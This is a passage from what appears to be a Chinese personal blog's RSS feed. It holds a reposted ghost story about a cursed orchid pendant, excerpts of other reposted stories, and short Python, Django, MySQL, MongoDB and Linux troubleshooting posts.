      <description>　春意正浓，城郊慈恩寺外的白玉兰已然盛开。每年到了这个时候，慈恩寺的香火便 特别兴旺。来拜祭的人中以女子居多，因为据说此时若来慈恩寺上香，一并拜祭兰花仙 子，可以给女子带来福运。久而久之，慈恩寺干脆在寺外一望无边的玉兰花林中修建了 一些小别院，让那些前来拜祭并赏花的大户人家提供一个小憩之所，也可以给寺里添一 些香火钱。 　“睿，准备好了吗？” 　“好了。哎！等等，咱们把这个小玉佛带上吧，请智清大师开光，可以避邪的！” 　“好啊！走吧。” 　南宫家的马车出了府门，直奔城外的慈恩寺而去。 　说到南宫家，一定要提一提南宫家的少奶奶。南宫家的少奶奶姓云，闺名幽兰，性 喜兰花，凡是与兰花有关的事物，她总是特别偏爱，顺带着，连蓝色的东西也颇得她青 睐。南宫睿与幽兰极为恩爱，总是喜欢搜罗一些幽兰喜欢的东西回家。不唯如此，她似 乎还特别与兰花有缘，她与南宫睿就是在慈恩寺外观玉兰时认识的。所以每年慈恩寺外 的白玉兰盛开之时，他总会带幽兰去小住一些日子，赏赏兰花，清清肺腑间的浊气，顺 道也可以去慈恩寺祈福。 　“怎么样？” 　“办妥了，智清大师说，等中秋就能来取了。” 　“好啊！” 　“咱们赏花去吧！” 　“嗯！” 　转眼间，金乌西坠，玉兔东升。南宫睿和幽兰在烂漫的花间漫步了几个时辰，早就 乏了，于是在小别院中坐了下来。泡一杯香茗，相视一笑，舒心畅谈，真是神仙过的日 子呢！ 　“睿，你看，今天的月亮好圆啊！” 　“是啊！花香、明月、清茗一杯，还有美人坐陪，人生如此，夫复何求啊！” 　幽兰娇嗔地一笑。南宫睿似要醉了。 　在幸福的时候，时光最容易不知不觉地流逝，一转眼，已近子时了。夹着兰花幽香 的夜风已有些许凉意了。 　“幽兰，咱们进屋吧，小心着凉！” 　“不嘛，这么美的月色，咱们多坐一会儿吧，好吗？” 　在幽兰盈盈的目光注视下，谁还能拒绝她的要求呢？何况是这么一个小小的要求。 　“那，我进屋去替你把披风拿出来，你在这儿等我一下。” 　“好啊！” 　“对了，你把披风放在哪儿了？” 　“记不太清了，好象是搁在床上了吧！” 　“那好，我先进去了，马上就回来。” 　“嗯！” 　一阵清风吹过，幽兰感到无比的惬意。她不禁站了起来，迎风而立，让丝裙在风中 飘动。她深吸了一口充满兰花幽香的空气，缓缓走到院门边，倚门而立，注视着院外盛 放的兰花。 　“嗳，~~~~~~~~” 　一声轻轻的叹息，在夜的寂静中特别刺耳。 　幽兰一转头，见一个白衣少妇立于玉兰花丛中。夜已深了，周围并无旁人，那声叹 息，当是出自这少妇。 　幽兰一时好奇心起，轻移莲足，来到少妇的身边，轻声问道：“这位姐姐，夜深 了，小心着凉！” 　那少妇闻声转过头来。如水的月光洒在她脸上，她的脸白得有些异常，但掩饰不了 她的娇艳。 　“着凉？……有什么要紧？我还要在乎着不着凉么？” 　说完又叹息了一声 。 　那叹息象是钻进幽兰心里，教她十分不忍。 　“这位姐姐，你有什么难处么？如果不妨，能否说给妹妹听听？也许妹妹能帮姐姐 稍稍分担些忧愁呢！” 　“你？嗳~~~~~~~~~ ” 　又是一声叹息，幽兰看着那泫然欲涕的少妇，觉得眼眶潮湿了。 　“姐姐，有什么事情是解决不了的呢？姐姐如此忧虑，妹妹实在于心不忍啊！” 　少妇闻言幽怨地看了她一眼，道：“很久了，我第一次遇见你这样善良的人。算 了，我知道你是好人，可我的事不是别人能帮上忙的。” 　“可是……” 　幽兰还想说点什么，却被少妇打断了。 　“嗳，不用说了，难得遇见你这样的好人，既然咱们这么有缘，这东西就送给你吧 ！” 　话音落处，少妇伸出的手掌中，赫然托着一枚兰花形的玉坠。那温润的白玉，在月 光的照耀下，闪着一种异样的光彩，一看便知不是寻常物品。 　“这，姐姐，我不能收。我没有为你做过什么，所谓无功不受禄。更何况，君子不 掠之美。姐姐的心意，妹妹这厢谢过了。” 　“你？你是嫌弃我么？” 　少妇的眼光中透出怒意，一转眼，又变成了一种莫名的悲哀神情。 　“嗳，~~~~~~，我知道你们终究都是嫌弃我的。” 　“这，姐姐，我，我，我不是那个意思，你知道的。” 　幽兰慌忙辩解到。 　“如果不是，就收下吧。来，姐姐给你戴上吧！” 　幽兰看着少妇那泪汪汪的眼睛，再看看那枚绝美的兰花坠子，竟无从拒绝了。 　“好了，你看，这不是很好吗？” 　幽兰低头望着胸前的兰花坠子，低声说：“多谢姐姐！” 　“谢什么？哈哈哈哈！……” 　幽兰惊奇地担头望向少妇，却惊奇地发现少妇满脸狂喜地盯着自己胸前的兰花坠 子。突然间，幽兰胸前的坠子在月光中发出一种妖异的光芒。迷迷惘惘之中，幽兰惊恐 地看见自己飘了起来。而更让她惊惧的是，地上居然还站着一个自己。让她的恐惧达到 极至的是，白衣少妇正与地上的另一个自己合而为一。 　“为什么？为什么？到底为什么啊？” 　她看见地上的“自己”妖冶地一笑：“二十年了，我等了整整二十年，终于等到你 这个傻女人心甘情愿地让我套上这枚兰花坠子。哈哈哈哈哈！我终于可以重新作人了。 你还是不要在这里傻站着了，去找 一个愿意接替你受苦的傻女人吧！哈哈哈哈！” 　“不！不！你怎么能这样？不！” 　“幽兰！幽兰！你在哪儿啊！幽兰！” 　院中传来南宫睿的声音。 　“幽兰！幽兰！” 　“哎！我就来！” 地上的“幽兰”答到。她望着幽兰得意地一笑：“我‘相公’在唤我了，我要回去 了，你还是快去找替身吧！记住！只能是月圆之夜，而且替身得是心甘情愿地套上这兰 花坠子的！希望你比我幸运，不用等二十年，二十年！哈哈哈哈！” 　“不！这不公平！不公平啊！为什么！？” 　幽兰泪如雨下，却无力阻止“幽兰”的离去。 　…… 　一转眼，幽兰成为游魂已经快半年了。中秋已近，各家各户都在忙着准备过节，可 幽兰还是孤伶伶的，没有着落。时至今日，幽兰仍时时会以为自己在作梦，一场没有边 际的噩梦。白衣妇人最后的话时时在她耳边回响。有好几次月圆之夜，她实在难以忍受 这种没有边际的痛苦，也曾动过找个替身的念头。可每当她拿起那枚兰花坠子，再想想 自己成为游魂之后所受的苦，她就是于心不忍。越是如此，她就越是矛盾，所以每到月 圆之时，就是幽兰最痛苦的时候。 　明日便是中秋了，月光分外的清明，冷冷的月光照在慈恩寺别院的青砖上。幽兰孤 伶伶地在玉兰林中游荡。现在并非花季，因此也罕有游人前来，更何况中秋佳节将至， 大家都回家与亲人团聚了。亲人，一想到这个词，幽兰就分外痛苦。南宫睿的声音在她 耳畔浮现。 　“幽兰，你知道你哪一点最吸引我吗？” 　“我，我怎么会知道呢？” 　“是你的善良，还有你的善解人意。” 　…… 　善良，要作一个善良的人其实是多么不易啊！如果她不把这兰花坠子转给别人，就 得永远作个孤苦的游魂，可是如果她把坠子给了别人，不就要让南宫睿失望了吗？ 　“嗳，~~~~~~” 　曾几何时，她还在为别人这样的叹息而忧心，如今自己竟也会如此叹息了。 　无论是哪一种选择，她的生活和南宫都不会再有交集了。可是她就是不忍让南宫睿 失望，即便他永远也不会知道她的选择。她伸开掌心，望着月光辉映下美仑美奂的兰花 坠子，有谁会知道这么美丽的东西，原来是个害人的妖物呢？ 　“算了，就让我永远当个孤苦的游魂吧！不要再去祸害别的人了。” 　一道白光划过夜幕，幽兰将坠子抛了出去…… 　中秋月夜，满月的光辉照着人间的万家灯火。南宫家的少奶奶“幽兰”正坐在院中 赏月。 　“小寒，少爷到底去哪儿了？都什么时辰了，怎么还没回来？” 　“回少奶奶，已经过了亥时了。少爷嘛，好象是去慈恩寺了。” 　“什么叫好象？大过节的，不在家里呆着，怎么又到慈恩寺去了？” 　“回少奶奶，我也隐约听那些少爷的跟班提过，所以不敢肯定。上回送去慈恩寺的 小玉佛已经开光了，奴婢猜想，少爷大约是赶去取小玉佛了。” 　“哦！那再等等吧！” 　“是！” 　她合上双眼，忽然想起了幽兰：“那个傻女人命倒好，有个这么好的老公，只可惜 无福消受。也不知她找到替身没有！哼！管她呢！我吃了二十年的苦才脱身，合该她倒 霉吧！” 　“幽兰！我回来了！我给你带了样好东西回来！” 　“什么好东西！？” 　“你一定猜不着，来，你闭上眼睛，我给你戴上！” 　“哼！什么好东西！我早就知道了！” 　“哎呀！你闭上眼睛嘛！” 　“幽兰”闭上眼睛，嘴角含着笑意！ 　“好了！”南宫睿说，“看，多漂亮！” 　“幽兰”睁开眼，用难以置信的眼神望着胸前的兰花坠子。 　“看，我就知道你会喜欢，对不对？慈恩寺小沙弥在花林中拾到这个坠子，正好我 去取开光的小玉佛，他说这坠子也许与我有缘，就给了我，我捐了些香火钱，就把它带 回来了。瞧！和你多配！我从没见过这么漂亮的兰花坠子呢！” 　“不！”“幽兰”惊慌失措，伸手想把坠子扯下来。忽然，满月的光芒在坠子上闪 过，发出妖异的光芒…… 　幽兰不知道是怎么回事，但睁开眼时已经在自己原来的房间里了，南宫睿正握着她 的手，用一种似乎亘古不变的温柔目光望着她。 　也许，真是一场梦吧！ 　“幽兰！你醒了？真把我吓坏了！都是我不好，不该把那个什么兰花坠子带回来。 那个坠子一定有邪气吧！还好，反正也不见了。以后咱们就戴这个小玉佛，好吗？” </description>
    </item>
    
    <item>
      <title>蔷薇园 (转)</title>
      <link>/posts/%E8%94%B7%E8%96%87%E5%9B%AD%E8%BD%AC/</link>
      <pubDate>Wed, 09 Jul 2014 00:56:50 +0000</pubDate>
      
      <guid>/posts/%E8%94%B7%E8%96%87%E5%9B%AD%E8%BD%AC/</guid>
      <description>天渐渐黑了，似乎要下雨，云厚得好象要掉下来。
我把皮箱放在因湿润而很柔软的地上，歇了歇。几茎草从土缝里挤出来，表舅家应该不远了。
由于严重的神经衰弱，医生告诉我必须静养一个时期。因此我想去表舅家住上一个月。据医生的说法，山水可以让我的神经复原。
那个小村子，在我的记忆中不象个真实的，然而母亲告诉我，我是在那儿出生，长到了三岁时才走。可我却记不得什么了，只记得一幢大院里来来去去的人，以及一些粗笨而老旧的家具。如果不是母亲给我的地址，我都不知道这个浙北的小村子在什么地方。
那是个春暮的黄昏。在一带隐隐的山影间，雾气弥漫。天已暗下来了，在那些雾气尚未合拢时，我看见了在山脚下的一幢十分古旧的建筑。我不由感到一阵欣慰&amp;ndash;终于，我赶在天黑以前来到表舅家了。
走到这幢旧屋前，我才发现那些巨大的参照物给我了一个多么错误的印象，在远处看来，这房子只不过古旧而已，掩映在树影里，还显得有点小巧玲珑。但走到跟前，我才发现光一扇门就足有五米高，那两扇门是用厚厚的山木做的，上面包着一层铁皮，钉着铜钉。年久失修，铁皮已多半已锈了，有些地方甚至已烂出了洞，露出下面的木头。铜钉也已经晦暗发绿，只是门上那两个熟铜门环，大约经常有人摸，倒是光润发亮。
门是用十分粗大的青石砌成的，两边的石条上刻了副对联，一边是“向阳花木春长在”，另一边是“积善人家庆有余”。很熟滥的联语，倒和这房子的格局很合适。
我走到门边，抓住门环。一股冰冷直沁心底，倒象是摸到了一块冰。我敲敲门，里面有人应了一声：“来了来了。”接着是有人趿着鞋走出来的声音。趁这机会，我回头看看烟雾缭绕的暮色。不知为什么，我突然感到一阵惊恐，仿佛突如其来的一阵寒流抓住了我。
那儿有些什么？
我正凝神眺望那一带树林，门“呀”一声，开了。</description>
    </item>
    
    <item>
      <title>玫瑰花妖（转）</title>
      <link>/posts/%E7%8E%AB%E7%91%B0%E8%8A%B1%E5%A6%96%E8%BD%AC/</link>
      <pubDate>Wed, 09 Jul 2014 00:50:04 +0000</pubDate>
      
      <guid>/posts/%E7%8E%AB%E7%91%B0%E8%8A%B1%E5%A6%96%E8%BD%AC/</guid>
      <description>洛小小是我深爱的女子。而两个性格同样倔强的人，爱的愈深就彼此伤得愈痛。总是这样，反反复复地争吵后和解，和解后再争吵。如此已纠缠了整整五年，厌倦，却是吸毒般地无法放弃。
那天的争吵是为了什么呢？记不得了，总之是非常无趣无聊的小事情，却害得她摔了六个碟子，砸了我最心爱的花瓶，把我的CD从九楼窗口扔了下去，流出的眼泪提纯后足可炒盘菜。我从一言不发到拍案而起，最后铁着脸走出了家门——应该算是家了吧，虽然我们都不肯用那纸薄薄的证书约束自己，毕竟也同居了那么久。
一个人，在阳光灿烂的小城里寂寥地走。
阳光渐渐消失，怒气也渐渐消失的时候，我发现自己居然漫无目的的闲游到了很远的城郊。有点累了，我停下来，坐在田埂边抽一支烟，一边抽烟，一边随意的张望。
近处是正在拔节的麦田。大片麦田的后面，是浅黄色的裸露的沙土地，沙地渐渐高上去，成了一方沙丘，长长的，而又平缓的。视线量过最高的地方，是一排如冬青般葱郁繁茂的植物。
我有种强烈的走进它们的欲望。于是，穿过狭窄的田埂，走过长长的沙土地，毫无预知地，我闯入了一个巨大而艳丽的梦境。全是玫瑰，野玫瑰。藤蔓纠缠，枝叶浓密。正值初夏，那青葱的，绿的可以滴出 水来的叶片间映衬着无数灼灼的殷红，是这样火暴热烈的绽放！
我闭上眼睛，贪婪的吸了一口气。花香如潮水般瞬间将我淹没。
我折了一枝玫瑰。小小看不到这样铺天盖地雄奇瑰丽的花事，也用这一枝换她的微笑吧。
“你是谁？怎么随便折我的花啊！”</description>
    </item>
    
    <item>
      <title>不离不弃的手札</title>
      <link>/posts/%E4%B8%8D%E7%A6%BB%E4%B8%8D%E5%BC%83%E7%9A%84%E6%89%8B%E6%9C%AD/</link>
      <pubDate>Mon, 07 Jul 2014 21:51:45 +0000</pubDate>
      
      <guid>/posts/%E4%B8%8D%E7%A6%BB%E4%B8%8D%E5%BC%83%E7%9A%84%E6%89%8B%E6%9C%AD/</guid>
      <description>&lt;p&gt;今日偶然翻出一本已经泛黄快要散页了的笔记本，里面记录了很多中医药方。意识到这是几十年前姥姥患病、姥爷亲自一笔一划收集整理的。二老已经离世十多年，却依然能从这模糊了大半的笔记中感受到他们那“你若不离不弃，我必生死相依”的爱情。&lt;/p&gt;
&lt;p&gt;由于笔记中有些内容已经不可辨析，我只能把还可辨认的部分记录出来，并且将我拿不准的地方加以标注。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;整理的纪念意义远大于医用意义，对于药方的功效作用不加以保证。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>64位win7安装mysql-python</title>
      <link>/posts/64%E4%BD%8Dwin7%E5%AE%89%E8%A3%85mysql-python/</link>
      <pubDate>Sun, 06 Jul 2014 09:01:14 +0000</pubDate>
      
      <guid>/posts/64%E4%BD%8Dwin7%E5%AE%89%E8%A3%85mysql-python/</guid>
      <description>64位win7使用pip安装mysql-python时提示unable to find vcvarsall.bat， 网上很多说这个解决这个需要安装那个MinGW，不过我安装并设置环境变量后依然没解决这个问题， 错误提示倒是变成了什么gcc错误一类的。 而从网上下载的win安装包都是32位，在我的机器上提示找不到python，找了很久后终于发现一个地方:http://www.lfd.uci.edu/~gohlke/pythonlibs/ 上有64位的， 而且这上面还有很多其他的64位三方包。 方便国内同学下载我把mysql-python转存到了我的网盘：http://pan.baidu.com/s/13vgjs</description>
    </item>
    
    <item>
      <title>解决ipad未能找到使用指定主机名的服务器</title>
      <link>/posts/%E8%A7%A3%E5%86%B3ipad%E6%9C%AA%E8%83%BD%E6%89%BE%E5%88%B0%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E5%90%8D%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Wed, 25 Jun 2014 11:15:35 +0000</pubDate>
      
      <guid>/posts/%E8%A7%A3%E5%86%B3ipad%E6%9C%AA%E8%83%BD%E6%89%BE%E5%88%B0%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E5%90%8D%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>最近联通不知道抽什么疯，Linux电脑只要访问二级域名就会跳转到恶心的DNS错误页面，甚至百度的二级域名都不行。那我玩ipad结果又访问不了App store，使用某些软件下东西又提示&#39;未能找到使用指定主机名的服务器&amp;rsquo;，但是微信又好用。
愤怒了，一看就是dns的问题，那就把动态链接改成静态链接，IP地址子网掩码默认路由根据实际情况修改，dns设置为8.8.8.8。
这样就能正常使用相关功能了。</description>
    </item>
    
    <item>
      <title>64位kali安装skype</title>
      <link>/posts/64%E4%BD%8Dkali%E5%AE%89%E8%A3%85skype/</link>
      <pubDate>Sun, 01 Jun 2014 08:36:23 +0000</pubDate>
      
      <guid>/posts/64%E4%BD%8Dkali%E5%AE%89%E8%A3%85skype/</guid>
      <description>参考了debian7的安装方式,首先运行:
# dpkg --add-architecture i386# apt-get update最初的时候64位系统是无法安装32位程序的。
然后安装相关依赖:</description>
    </item>
    
    <item>
      <title>Windows下的django批处理运行脚本</title>
      <link>/posts/windows%E4%B8%8B%E7%9A%84django%E6%89%B9%E5%A4%84%E7%90%86%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Thu, 15 May 2014 12:03:58 +0000</pubDate>
      
      <guid>/posts/windows%E4%B8%8B%E7%9A%84django%E6%89%B9%E5%A4%84%E7%90%86%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</guid>
      <description>回来半个月，终于抽出时间写点东西了。最近这天气真是让人不开心阿～不过昨天居然见到了彩虹，突然想起来在飞机上看见的彩虹是直立在太阳两边而不是桥形的，各有各的美感。
至于在win下如何安装python、setuptools、pip等网上很多这里不再重复，可是那些大小姐们向我反映说她们不会“运行cmd,输入python manage.py runserver”。正所谓收人钱财替人消灾，干脆写个批处理让她们双击运行算了，内容如下：
@echo offpython %cd%\manage.py runserverpause真是被微软“惯坏了”的孩子们阿&amp;hellip;.</description>
    </item>
    
    <item>
      <title>且行且珍惜</title>
      <link>/posts/%E4%B8%94%E8%A1%8C%E4%B8%94%E7%8F%8D%E6%83%9C/</link>
      <pubDate>Fri, 25 Apr 2014 15:40:38 +0000</pubDate>
      
      <guid>/posts/%E4%B8%94%E8%A1%8C%E4%B8%94%E7%8F%8D%E6%83%9C/</guid>
      <description>今天就是实习的最后一天了，做完了工作交接还真是清闲阿～祈祷明天是个好天气吧！！可千万不要像马航一样飞飞就消失了T_T。
也正因为清闲，所以看到了一个让我十分震惊的“小说”。突然后悔起来，怎么就没事瞎看，怎么就还全都看完了。有时候，无知真的是福气。
如果是几年之前的我看到这个，一定不会是现在这么冷静吧。这就是成长？不过真是没想到如此“曲折”的事情居然真的会发生，果然是艺术来源与生活阿！每个人都有自己选择未来之路的权力，最为一个旁观者，或许只能从文字之间去体会作者的情感了。
人生几十年，总是有人出现在我们的生命中，也总是有人消失在我们的生命中。从相识到相知再到最后的相离，其中掺杂了无数的苦辣酸甜，也正是这些构成了每个人不一样的回忆。我们无法控制何时相识、何时相离，或许想做到分离时“挥一挥衣袖，不带走一片云彩”，对别人来说却是“挥一挥衣袖，带走了整个天空”。分离时的撕心裂肺到几年、几十年后也云淡风轻了吧，或许还会成为大多数人不曾有过的回忆。
能够平静面对分离，真是一种境界。
最后，就像那句话说的——且行且珍惜（貌似这句话最近快被玩坏了？）。祝愿那些曾在生命中出现的过客安好。</description>
    </item>
    
    <item>
      <title>趣文：追MM的各种算法</title>
      <link>/posts/%E8%B6%A3%E6%96%87%E8%BF%BDmm%E7%9A%84%E5%90%84%E7%A7%8D%E7%AE%97%E6%B3%95/</link>
      <pubDate>Mon, 21 Apr 2014 09:05:12 +0000</pubDate>
      
      <guid>/posts/%E8%B6%A3%E6%96%87%E8%BF%BDmm%E7%9A%84%E5%90%84%E7%A7%8D%E7%AE%97%E6%B3%95/</guid>
      <description>&lt;p&gt;转自：http://blog.jobbole.com/65500/&lt;/p&gt;
&lt;h3 id=&#34;动态规划&#34;&gt;动态规划&lt;/h3&gt;
&lt;p&gt;基本上就是说：你追一个MM的时候，需要对该MM身边的各闺中密友都好，这样你追MM这个问题就分解为对其MM朋友的问题，只有把这些问题都解决 了，最终你才能追到MM。因此，该问题适用于聪明的MM，懂得“看一个人，不是看他如何对你，而是看他如何对他人。”的道理，并且对付这样的MM总能得到 最优解。但确定是开销较大，因为每个子问题都要好好对待……&lt;/p&gt;
&lt;h3 id=&#34;贪心法&#34;&gt;贪心法&lt;/h3&gt;
&lt;p&gt;基本上就是：你追一个MM的时候，从相识到相知，每次都采用最aggressive的方式，进攻进攻再进攻！从不采用迂回战术或是欲擒故纵之法！目标是以最快的速度确立两人的关系。该法优点是代价小，速度快，但缺点是不是每次都能得到最优解……、&lt;/p&gt;
&lt;h3 id=&#34;回溯算法&#34;&gt;回溯算法&lt;/h3&gt;
&lt;p&gt;基本上就是：追一个MM，但也许你还是情窦初开的新手，不知道如何才能讨得MM的欢心，于 是你只好一条路一条路的试，MM不开心了，你就回溯回去换另一种方式。当然其间你也许会从某些途径得到一些经验，能够判断哪些路径不好，会剪枝（这就是分 支估界了）。你也可以随机选择一些路径来实施，说不定能立杆见影（这就是回溯的优化了）但总的来说，你都需要一场持久战……该算法一般也能得到最优解，因 为大多数MM会感动滴！！但其缺点是开销大除非你是非要谈一场恋爱不可，否则不推荐使用。特别是你可能还有许多其他的事情要做，比如学习，比如事业……&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>虚拟环境pycurl的import错误</title>
      <link>/posts/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83pycurl%E7%9A%84import%E9%94%99%E8%AF%AF/</link>
      <pubDate>Mon, 14 Apr 2014 11:56:49 +0000</pubDate>
      
      <guid>/posts/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83pycurl%E7%9A%84import%E9%94%99%E8%AF%AF/</guid>
      <description>今天需要在虚拟环境下使用pycurl，使用pip安装时候没问题，不过再代码中import后则报错：
ImportError: pycurl: libcurl link-time ssl backend (nss) is different from compile-time ssl backend (none/other)解决方法：</description>
    </item>
    
    <item>
      <title>调试python程序</title>
      <link>/posts/%E8%B0%83%E8%AF%95python%E7%A8%8B%E5%BA%8F/</link>
      <pubDate>Thu, 10 Apr 2014 18:06:03 +0000</pubDate>
      
      <guid>/posts/%E8%B0%83%E8%AF%95python%E7%A8%8B%E5%BA%8F/</guid>
      <description>&lt;p&gt;怪不得这几天头疼的厉害，原来是发生了2件大事：官方的XP彻底和我们告别了and爆发了OpenSSL HeartBleed漏洞。这个漏洞可以说是一场大地震，不知道又会有多少网站被“扒光脱裤”，过一阵又得改密码玩了。面对这种网络安全问题，真的是一种待宰羔羊的无力感。&lt;/p&gt;
&lt;p&gt;调试python程序我知道有3个东东：pdb,ipdb,pudb。&lt;/p&gt;
&lt;p&gt;第一个是python自带模块，第二个如果安了ipython的话貌似自己就被安装了，最后一个有图形界面，十分复古的——蓝底，真是让人怀念。后2个都可以使用pip安装。
ipdb支持语法高亮，不过貌似中文支持不太好。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>python列表展开</title>
      <link>/posts/python%E5%88%97%E8%A1%A8%E5%B1%95%E5%BC%80/</link>
      <pubDate>Wed, 09 Apr 2014 16:27:16 +0000</pubDate>
      
      <guid>/posts/python%E5%88%97%E8%A1%A8%E5%B1%95%E5%BC%80/</guid>
      <description>某网站今年笔试题，本质就是把某多维数组变成一维数组并去重。本来要求用JS实现，不过用python更简洁一点，就是对列表进行展开操作，递归就KO了。
首先来个不简洁的：
arr = [1, [1, 2, [2, 3]], [4], [4]]final=[]def change(x):print &amp;#34;x is:&amp;#34;,xif isinstance(x, list):for l in x:print &amp;#34;l is:&amp;#34;,lchange(l)else:final.</description>
    </item>
    
    <item>
      <title>Mongodb初用记录</title>
      <link>/posts/mongodb%E5%88%9D%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
      <pubDate>Wed, 09 Apr 2014 09:06:23 +0000</pubDate>
      
      <guid>/posts/mongodb%E5%88%9D%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
      <description>关于介绍以及缺点等网上介绍很多，这里记录一下我遇到的问题：
首先就是使用yum install安装后的mongodb无法设定开机启动。其次，即使修改了/etc/monggdb.conf文件的相关路径，运行时还必须手动指定dbpath参数才可运行。
于是按照官方指南说明的方法，添加了mongodb的源，安装yum install mongo-10gen mongo-10gen-server之后chkconfig mongod on才能设定成为开机启动。不过使用service mongod start启动、停止、重起服务会出现假死。但是不影响使用。</description>
    </item>
    
    <item>
      <title>django自带的评论模块</title>
      <link>/posts/django%E8%87%AA%E5%B8%A6%E7%9A%84%E8%AF%84%E8%AE%BA%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Fri, 04 Apr 2014 11:01:59 +0000</pubDate>
      
      <guid>/posts/django%E8%87%AA%E5%B8%A6%E7%9A%84%E8%AF%84%E8%AE%BA%E6%A8%A1%E5%9D%97/</guid>
      <description>某个设计本来采用了一个比较不错的在线评论模块，不过答辩的时候丫居然不给网！！想偷个懒还是挺难啊&amp;hellip;.
那就用自带的评论模块吧，django版本是1.5.3。
首先把&#39;django.contrib.comments&#39;添加到INSTALLED_APPS中，然后添加url:
urlpatterns = patterns(&amp;#39;&amp;#39;,......url(r&amp;#39;^comments/&amp;#39;, include(&amp;#39;django.contrib.comments.urls&amp;#39;)),......)在需要显示评论的HTML中：</description>
    </item>
    
    <item>
      <title>django中由类实例引起的小坑</title>
      <link>/posts/django%E4%B8%AD%E7%94%B1%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%BC%95%E8%B5%B7%E7%9A%84%E5%B0%8F%E5%9D%91/</link>
      <pubDate>Tue, 01 Apr 2014 11:38:13 +0000</pubDate>
      
      <guid>/posts/django%E4%B8%AD%E7%94%B1%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%BC%95%E8%B5%B7%E7%9A%84%E5%B0%8F%E5%9D%91/</guid>
      <description>自己封装了一个logging在django中使用，结果发现输出的时候总是重复输出，比如：
DEBUG---- 2014/03/31 10:38:13:!!DEBUG---- 2014/03/31 10:38:13:!!DEBUG---- 2014/03/31 10:38:13:!</description>
    </item>
    
    <item>
      <title>mysql-python:not all arguments converted during string formatting</title>
      <link>/posts/mysql-python-not-all-arguments-converted-during-string-formatting/</link>
      <pubDate>Thu, 27 Mar 2014 18:07:49 +0000</pubDate>
      
      <guid>/posts/mysql-python-not-all-arguments-converted-during-string-formatting/</guid>
      <description>今天把django从1.5.5升级到了1.6.2，结果使用mysql-python查询数据库时候就报了这个错误：“not all arguments converted during string formatting”
貌似这个问题应该和django没什么关系，正好今天就看看mysql-python的源码吧。想看如何解决的请直接跳到最后。
查询部分简化后如下：
posistion = &amp;#34;top&amp;#34;order = r&amp;#34;select id,p_name,p_explain,p_href from pictures where p_position = %s and p_show = 1 order by -id&amp;#34;self.</description>
    </item>
    
    <item>
      <title>Django的view中常用return方法</title>
      <link>/posts/django%E7%9A%84view%E4%B8%AD%E5%B8%B8%E7%94%A8return%E6%96%B9%E6%B3%95/</link>
      <pubDate>Tue, 25 Mar 2014 18:28:00 +0000</pubDate>
      
      <guid>/posts/django%E7%9A%84view%E4%B8%AD%E5%B8%B8%E7%94%A8return%E6%96%B9%E6%B3%95/</guid>
      <description>&lt;p&gt;第一种HttpResponse，最基本的返回方式，可以直接返回字符:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.http &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; HttpResponse
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;(request):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; HttpResponse(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;a test&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者结合contextloder返回网页：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.template &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Context, loader  
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; polls.models &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Poll
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;(request):  
    latest_poll_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Poll&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order_by(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-pub_date&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]  
    template &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; loader&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get_template(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;polls/index.html&amp;#39;&lt;/span&gt;)
    context &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Context({ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;latest_poll_list&amp;#39;&lt;/span&gt;: latest_poll_list, })  
